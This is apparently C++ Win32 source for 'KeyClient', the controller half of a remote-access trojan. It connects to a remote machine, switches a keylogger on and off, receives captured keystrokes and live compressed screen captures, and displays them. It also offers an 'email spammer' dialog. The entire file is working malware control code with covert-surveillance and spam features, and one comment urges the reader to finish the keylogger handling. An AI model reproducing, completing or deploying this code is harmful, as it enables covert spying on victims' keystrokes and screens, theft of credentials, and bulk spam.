#include "project_client.h"
#include  "email.h"



map<string, CLIENT_MESSAGES> MESSAGEMAP;

struct sockaddr_in clientsocket;
SOCKET sa;
stringstream KEYLOG_STREAM;
char client_buffer[BUFFER_SZ];
string client_operator, client_operand;
string keylog = "Keylog window:\n";

/*  Make the class name into a global variable  */
char szClassName[ ] = "KeyClient";
HWND g_hToolbar = NULL;

        int bitcounter = 0, framesdrawn = 0;
        bool pkt_complete = false;


        unsigned char *bitmapbuf, *bitmapbuf_compressed;

        IMAGE_PKT_HEADER hdrpkt;
        BITMAPINFOHEADER bi;
        HDC handle_WindowDC;
        PAINTSTRUCT paintstruct;


int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{

    MESSAGEMAP["KEYLOG"] = KEYLOG;
    MESSAGEMAP["STREAMPICTURE"] = STREAMPICTURE;
    MESSAGEMAP["BITMAPHDR"] = BITMAPHDR;
    MESSAGEMAP["BITMAPDATA"] = BITMAPDATA;
    MESSAGEMAP["BITMAPEND"] = BITMAPEND;



    /*INITIALIZE WINSOCK*/
    WSADATA wsa;

          if (WSAStartup(MAKEWORD(2,2), &wsa)!=0)  {
                  //more error checking
                    int x = WSAGetLastError();
                    stringstream ss;
                    ss <<"Error: " << x << " From WSAGetLastError() From WSAStart() !";
                    MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
            }

    HWND hwnd;               /* This is the handle for our window */
    MSG messages;            /* Here messages to the application are saved */
    WNDCLASSEX wincl;        /* Data structure for the windowclass */



    /* The Window structure */
    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;      /* This function is called by windows */
    wincl.style = CS_DBLCLKS;                 /* Catch double-clicks */
    wincl.cbSize = sizeof (WNDCLASSEX);

    /* Use default icon and mouse-pointer */
    wincl.hIcon = LoadIcon(hThisInstance, MAKEINTRESOURCE(IDI_MYICON));
    wincl.hIconSm = LoadIcon(hThisInstance, MAKEINTRESOURCE(IDI_MYICON));
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = MAKEINTRESOURCE(IDR_MYMENU);
    wincl.cbClsExtra = 0;                      /* No extra bytes after the window class */
    wincl.cbWndExtra = 0;                      /* structure or the window instance */
    /* Use Windows's default colour as the background of the window */
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;

    /* Register the window class, and if it fails quit the program */
    if (!RegisterClassEx (&wincl))
        return 0;

    /* The class is registered, let's create the program*/
    hwnd = CreateWindowEx (
           0,                   /* Extended possibilites for variation */
           szClassName,         /* Classname */
           "KeyClient",       /* Title Text */
           WS_OVERLAPPEDWINDOW|WS_BORDER, /* default window */
           CW_USEDEFAULT,       /* Windows decides the position */
           CW_USEDEFAULT,       /* where the window ends up on the screen */
           650,                 /* The programs width */
           480,                 /* and height in pixels */
           HWND_DESKTOP,        /* The window is a child-window to desktop */
           NULL,                /* No menu */
           hThisInstance,       /* Program Instance handler */
           NULL                 /* No Window Creation data */
           );

    /* Make the window visible on the screen */
    ShowWindow (hwnd, nCmdShow);


    /* Run the message loop. It will run until GetMessage() returns 0 */
    while (GetMessage (&messages, NULL, 0, 0)>0)
    {
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }

    /* The program return-value is 0 - The value that PostQuitMessage() gave */
    return messages.wParam;
}


/*  This function is called by the Windows function DispatchMessage()  */

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{

    switch (message)
    {
       case WM_CREATE:{

            HINSTANCE hInstance = GetModuleHandle(NULL);
            CreateWindowEx(NULL, "BUTTON", "Send DialogBox", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 665, 290, 150, 24, hwnd, (HMENU)MAIN_WINDOW_BUTTONMSG1, hInstance, NULL);
            CreateWindowEx(NULL, "BUTTON", "Connect To IP: ", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 15, 395, 150, 24, hwnd, (HMENU)CONNECT_TO_HOST, hInstance, NULL);
            CreateWindowEx(NULL, "EDIT", "127.0.0.1", WS_CHILD | WS_VISIBLE | WS_BORDER , 200, 395, 150, 24, hwnd, HMENU(IPADDR_EDIT), hInstance, NULL);
            CreateWindowEx(NULL, "EDIT", "80", WS_CHILD | WS_VISIBLE | WS_BORDER, 360, 395, 75, 24, hwnd, HMENU(PORTNUMBER_EDIT), hInstance, NULL);
            CreateWindowEx(NULL, "BUTTON", "Disconnect Client", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460, 395,195, 24, hwnd, HMENU(DISCONNECT_HOST), hInstance, NULL);
            CreateWindowEx(NULL, "STATIC", "Status: Client Initialized! No errors so far!", WS_CHILD|WS_VISIBLE|SS_SUNKEN,15, 425, 640, 18, hwnd, HMENU(STATIC_STATUS_TEXT), hInstance, NULL);
            CreateWindowEx(NULL, "EDIT", "Keylog Window: ", WS_CHILD|WS_VISIBLE|ES_READONLY|ES_MULTILINE|WS_VSCROLL, 15, 445, 640, 65, hwnd, HMENU(KEYLOG_WINDOW), hInstance, NULL);
            CreateWindowEx(NULL, "BUTTON", "Keylogger On", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 15, 515, 115, 15, hwnd, HMENU(CHK_KEYLOG), hInstance, NULL);
            CreateWindowEx(NULL, "BUTTON", "Keylogger Off", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 145, 515, 120, 15, hwnd, HMENU(UNCHK_KEYLOG), hInstance, NULL);
            CreateWindowEx(NULL, "BUTTON", "Start Stream", WS_VISIBLE | WS_CHILD, 270, 515, 125, 17, hwnd, HMENU(STREAM_BUTTON), hInstance, NULL);
            CreateWindowEx(NULL, "STATIC", "Stream: ", WS_CHILD|WS_VISIBLE|SS_SUNKEN, 15, 5, 640, 20, hwnd, HMENU(STREAM_STATUS), hInstance, NULL);
            CreateWindowEx(NULL, "BUTTON", "Stop Stream", WS_VISIBLE | WS_CHILD, 400, 515, 125, 17, hwnd, HMENU(STOP_STREAM), hInstance, NULL);
        }
        break;

        case CLIENTMESSAGE_SYNC:{

            switch(LOWORD(lParam)){

                case FD_CLOSE:{
                     MessageBox(NULL, "ZOMG! The host disconnected for some odd reason!\nDid you kill the server?", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);
                     SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Disconnected.");
                }
                break;
                case FD_CONNECT:
                    //MessageBox(NULL, "Attempting connection!", "Attempting connection!", MB_OK | MB_ICONINFORMATION);
                break;
                case FD_WRITE:
                    SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Command Sent you stupid skid!");
                break;
                case FD_READ:{

                    //HINT HINT, Since the keylogger feature isnt implemented. Guess what? Implement it here.
                    //Whenever the server gets a read message, parse the message into a operator/operand like the server
                    //if the operator is  of Keylog or KG or whatever, then process it in a way which sends it to our KEY_LOG WINDOW
                    //That way we can differentiate between statuses and Keylogwindow!
                    //You can add other ways in which the server sends messages to client.
                    //This can be a great chat client as well!

                    //client_operator = "", client_operand = "";

                       /* memset(&client_buffer[0], '\0', BUFFER_SZ);
                        HandleError(recv(sa, client_buffer,  BUFFER_SZ, NULL));

                         int forcount = 0;
                         for (; client_buffer[forcount] != '>'; forcount++){
                            client_operator += client_buffer[forcount];
                         }

                            //PARSE THE OPERAND
                        forcount++;
                        for (; client_buffer[forcount] != '<'; forcount++){
                            client_operand += client_buffer[forcount];
                        }

                        map<string, CLIENT_MESSAGES>::iterator i = MESSAGEMAP.find(client_operator);*/

                    PKT pkt;

                    recv(sa, (char*)&pkt, sizeof(PKT), 0);

                    client_operator.clear();
                    client_operand.clear();
                    client_operator.append(pkt.command);

                    map<string, CLIENT_MESSAGES>::iterator i = MESSAGEMAP.find(client_operator);

                        switch(i->second){

                            case KEYLOG: {

                                keylog.append(reinterpret_cast<char *>(pkt.data));
                                //std::cout <<"\n" <<keylog;
                                SetDlgItemText(hwnd, KEYLOG_WINDOW, keylog.c_str());

                            }
                            break;

                            case BITMAPHDR:{



                                hdrpkt = *(IMAGE_PKT_HEADER *)pkt.data;

                                bitmapbuf = new unsigned char[hdrpkt.uncompressed_size];
                                bitmapbuf_compressed = new unsigned char[hdrpkt.compressed_Size];

                                bi = hdrpkt.bitmaphdr;

                                stringstream ss;
                                framesdrawn++;
                                ss << "Stream Original Resolution: " << hdrpkt.origx << ", " << hdrpkt.origy
                                   << " || Stretched to: 640, 360 || " <<  framesdrawn << " Frames drawn at 10 fps";
                                SetDlgItemText(hwnd, STREAM_STATUS, ss.str().c_str());

                            }

                            break;

                            case BITMAPDATA:{


                                for(int i = 0; i<4096 && bitcounter < hdrpkt.compressed_Size; i++){

                                    bitmapbuf_compressed[bitcounter] = pkt.data[i];
                                    bitcounter++;
                                    //std::cout << "\n"<< bitcounter
                                }
                            }

                            break;

                            case BITMAPEND:{
                                //MessageBox(NULL, NULL,
                                   //        "Bitmapend", NULL);
                                bitcounter = 0;
                                pkt_complete = true;

                                //uncompress(newbuff, &dwBmpSize, buff, buffersz);
                                uncompress(bitmapbuf, &hdrpkt.uncompressed_size, bitmapbuf_compressed, hdrpkt.compressed_Size);

                                RedrawWindow(hwnd, NULL,NULL, RDW_INVALIDATE);



                            }
                            break;

                            case STREAMPICTURE: //pic
                            break;

                            default: SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Message from server not recognized!");
                        }

                        SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Server processed message and executed!");

                        //SetDlgItemText(hwnd, KEYLOG_WINDOW, "Keylog Window: ");

                }
                break;

            }

        }

        case WM_PAINT:{

            //handle_WindowDC = BeginPaint(hwnd, &paintstruct);




            //EndPaint(hwnd, &paintstruct);

            if (pkt_complete){

                handle_WindowDC = BeginPaint(hwnd, &paintstruct);

                    SetDIBitsToDevice(handle_WindowDC, 15, 30, 640, 360, 0, 0, 0, 360, bitmapbuf, (BITMAPINFO *)&bi, DIB_RGB_COLORS );

                EndPaint(hwnd, &paintstruct);
                ReleaseDC(hwnd, handle_WindowDC);

                delete[] bitmapbuf;
                delete[] bitmapbuf_compressed;
                pkt_complete = false;
                //MessageBox(NULL, "I am painting", NULL, NULL);

            }else return DefWindowProc (hwnd, message, wParam, lParam);
        }

        break;

        case WM_COMMAND:

            switch(LOWORD(wParam)){
                case CHK_KEYLOG:{

                    //If the button is already checked, then break out.
                    if (BST_CHECKED == IsDlgButtonChecked(hwnd, CHK_KEYLOG)){
                        break;
                    }
                    CheckDlgButton(hwnd, CHK_KEYLOG, BST_CHECKED);
                    CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_UNCHECKED);
                    PKT pktkey;
                    strncpy(pktkey.command, "KEYLOG\0", 7);
                    HandleError(send(sa, (char *)&pktkey, sizeof(pktkey), 0));
                    //MessageBox(NULL, "Keylog", NULL, NULL);

                }
                break;

                case STREAM_BUTTON:{

                    PKT pktstream;
                    strncpy(pktstream.command, "STREAMPICT\0", 11);


                    HandleError(send(sa, (char *)&pktstream, sizeof(pktstream), 0));

                }break;

                case UNCHK_KEYLOG:{

                    //If the button is already checked, then break out.
                    if (BST_CHECKED == IsDlgButtonChecked(hwnd, UNCHK_KEYLOG)){
                        break;
                    }
                    CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_CHECKED);
                    CheckDlgButton(hwnd, CHK_KEYLOG, BST_UNCHECKED);
                    //MessageBox(NULL, "stop Keylog", NULL, NULL);

                    //MessageBox(NULL,NULL,NULL,NULL);
                    PKT pktunkey;
                    strncpy(pktunkey.command, "STOPKEYLOG\0", 11);
                    HandleError(send(sa, (char *)&pktunkey, sizeof(pktunkey), 0));

                }
                break;

                case MAIN_WINDOW_BUTTONMSG1:{
                    DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_MSGBOXTRIG), hwnd, MsgBoxTrigger);
                }break;

                case DISCONNECT_HOST:{
                    PKT pktdc;
                    strncpy(pktdc.command, "DISCONNECT\0", 11);
                    HandleError(send(sa, (char *)&pktdc, sizeof(pktdc), 0));
                    Sleep(1000);
                    HandleError(closesocket(sa));
                    MessageBox(NULL, "Disconnected from client!", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);

                }break;

                case CONNECT_TO_HOST:{

                    //Get length so we know how much to allocate in heap.
                    //Then use new operator to make room for the string. And then Get dialog text to fill the array.
                    //We then do whatever.
                    int iplen = GetWindowTextLength(GetDlgItem(hwnd, IPADDR_EDIT));
                    int portlen = GetWindowTextLength(GetDlgItem(hwnd, PORTNUMBER_EDIT));

                    HandleError(iplen);
                    HandleError(portlen);

                    char* ipbuff = new char[iplen+1];
                    char* portbuff = new char[portlen+1];

                    HandleError(GetDlgItemText(hwnd, IPADDR_EDIT, ipbuff, iplen + 1));
                    HandleError(GetDlgItemText(hwnd, PORTNUMBER_EDIT, portbuff, portlen+1));

                        string ipaddress(ipbuff);
                        int portnumber = atoi(portbuff);

                        sa = socket(AF_INET, SOCK_STREAM, 0);
                        HandleError(sa);
                        //HandleError(4);


                        clientsocket.sin_family = AF_INET;
                        clientsocket.sin_addr.s_addr = inet_addr(ipaddress.c_str());
                        clientsocket.sin_port = htons (portnumber);

                        HandleError(WSAAsyncSelect(sa, hwnd, CLIENTMESSAGE_SYNC, FD_CONNECT|FD_READ|FD_WRITE|FD_CLOSE));


                        if (HandleError(connect(sa, (struct sockaddr *)&clientsocket, sizeof(clientsocket))) == SOCKET_ERROR){
                            break;
                        }else MessageBox(NULL, "Success! Client connected successfully!", "Success!", MB_OK | MB_ICONINFORMATION);

                        //char client_buffer[500];

                        //recv(sa, client_buffer, 500, 0);

                        //send(sa, "MESSAGE2>", 20, 0);

                        //send() directly? Or call a function()? Send a message?


                    delete []ipbuff;
                    delete []portbuff;




                }break;



                case ID_FILE_EXIT:
                      PostQuitMessage (0);
                    break;

                case IDM_ABOUT1:{

                    int ret = DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_ABOUT),hwnd, AboutDlgProc);

                    if (ret == IDOK){

                        MessageBox(hwnd, "Thanks for noticing the author!", "ty", MB_OK | MB_ICONINFORMATION);

                    }else if(ret == IDCANCEL){

                        MessageBox(hwnd, "Thanks for noticing the author!", "ty", MB_OK | MB_ICONINFORMATION);

                    }else if(ret == -1){

                        MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION);

                    }


                }
                break;

                case IDM_CONTACT:{

                         HandleError(DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_EMAILME),hwnd, EmailMeDlg));


                }
                break;

                case IDM_EMAIL_SPAMMER:

                    int ret = DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_ESPAMMER),hwnd, ESpamDlg);

                    if(ret == -1){

                        HandleError(MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION));

                    }

                    break;

            }

        break;
        case WM_DESTROY:{
            HandleError(WSACleanup());
            PostQuitMessage (0);       /* send a WM_QUIT to the message queue */

        }

        break;
        default:                      /* for messages that we don't deal with */
            return DefWindowProc(hwnd, message, wParam, lParam);
    }
        return 0;
}



//http://us.generation-nt.com/answer/getdlgitemfloat-help-26637032.html
//Grab a floating point string from the form. Used in the email spammer.
float GetDlgItemFloat(HWND hDlg, int id){

    TCHAR *pEnd;
    TCHAR szItemText[20];
    GetDlgItemText(hDlg, id, szItemText, 20);

    return (float)strtod(szItemText, &pEnd);
}


int HandleError(int error){

   if ( error < 0){

        stringstream ss;
        ss <<"ErrorC: " << WSAGetLastError() << " From WSA/GetLastError()!";
        MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);

    }else return 0;

    return 0;
}

